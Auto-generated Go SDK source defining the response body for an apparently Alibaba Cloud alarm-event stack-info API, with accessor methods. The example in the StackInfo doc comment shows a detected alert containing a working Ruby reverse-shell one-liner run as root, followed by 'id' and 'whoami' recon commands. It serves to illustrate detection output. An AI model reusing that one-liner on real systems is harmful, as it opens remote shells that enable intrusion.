// This file is auto-generated, don't edit it. Thanks.
package client

import (
	"github.com/alibabacloud-go/tea/dara"
)

type iDescribeAlarmEventStackInfoResponseBody interface {
	dara.Model
	String() string
	GoString() string
	SetRequestId(v string) *DescribeAlarmEventStackInfoResponseBody
	GetRequestId() *string
	SetStackInfo(v string) *DescribeAlarmEventStackInfoResponseBody
	GetStackInfo() *string
}

type DescribeAlarmEventStackInfoResponseBody struct {
	// The ID of the request.
	//
	// example:
	//
	// ECC6B3E3-D496-512D-B46D-E6996A6B63EE
	RequestId *string `json:"RequestId,omitempty" xml:"RequestId,omitempty"`
	// The stack information of the alert details.
	//
	// example:
	//
	// [ { "child": [ { "child": [ { "child": [ ], "data": { "cmdline": "id", "proc_path": "/bin/id", "pid": "[3033]" }, "description": { "extend": [ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } }, { "child": [ ], "data": { "cmdline": "whoami", "proc_path": "/bin/whoami", "pid": "[3035]" }, "description": { "extend": [ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ], "data": { "cmdline": "/bin/bash -c \\"id && whoami\\"", "proc_path": "/bin/bash", "pid": "[3022]" }, "description": { "extend": [ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ], "data": { "src_ip": "0.0.0.0", "cmdline": "ruby -rsocket -e exit if fork;c=TCPSocket.new(\\\\"0.0.0.0\\\\",\\\\"1111\\\\");while(cmd=c.gets);IO.popen(cmd,\\\\"r\\\\"){|io|c.print io.read}end", "file": "ruby", "login_port": "22", "login_type": "Password", "proc_path": "/usr/bin/ruby", "dst_port": "1111", "pid": "3011", "user": "root", "dst_ip": "0.0.0.0", "log_time": "2020-01-20 09:00:00" }, "description": { "extend": [ { "content": "${tpl_netstat}", "content_type": "text" } ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ]
	StackInfo *string `json:"StackInfo,omitempty" xml:"StackInfo,omitempty"`
}

func (s DescribeAlarmEventStackInfoResponseBody) String() string {
	return dara.Prettify(s)
}

func (s DescribeAlarmEventStackInfoResponseBody) GoString() string {
	return s.String()
}

func (s *DescribeAlarmEventStackInfoResponseBody) GetRequestId() *string {
	return s.RequestId
}

func (s *DescribeAlarmEventStackInfoResponseBody) GetStackInfo() *string {
	return s.StackInfo
}

func (s *DescribeAlarmEventStackInfoResponseBody) SetRequestId(v string) *DescribeAlarmEventStackInfoResponseBody {
	s.RequestId = &v
	return s
}

func (s *DescribeAlarmEventStackInfoResponseBody) SetStackInfo(v string) *DescribeAlarmEventStackInfoResponseBody {
	s.StackInfo = &v
	return s
}

func (s *DescribeAlarmEventStackInfoResponseBody) Validate() error {
	return dara.Validate(s)
}
